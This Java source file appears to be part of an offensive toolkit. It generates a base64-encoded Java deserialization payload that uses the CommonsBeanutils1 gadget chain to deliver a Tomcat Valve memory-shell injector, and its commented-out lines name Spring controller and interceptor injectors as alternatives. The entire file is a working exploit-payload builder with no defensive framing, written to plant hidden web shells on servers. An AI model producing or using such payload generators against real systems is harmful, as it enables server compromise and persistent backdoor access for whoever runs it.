package com.threed.client;

import com.threed.payloads.CommonsBeanutils1;
import com.threed.shell.tomcat.TomcatValueInject;
import com.threed.utils.utils;
import javassist.ClassPool;
import javassist.CtClass;
import sun.misc.BASE64Encoder;

import java.io.FileOutputStream;
import java.nio.charset.StandardCharsets;
import java.util.Queue;

/**
 * @className: Client
 * @description: TODO 类描述
 * @author: two_day
 * @date: 2022/5/27
 **/
public class Client {

    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();

//        CtClass clazz = pool.get(SpringControllerInject.class.getName());
//        CtClass clazz = pool.get(SpringInterceptorInject.class.getName());
        CtClass clazz = pool.get(TomcatValueInject.class.getName());
        Queue<Object> object = new CommonsBeanutils1().getObject(clazz.toBytecode());
        byte[] serialize = utils.serialize(object);
        String encode = new BASE64Encoder().encode(serialize);
        FileOutputStream fos = new FileOutputStream("tomcatValueInjectBase64.txt");
        fos.write(encode.getBytes(StandardCharsets.UTF_8));
    }

}
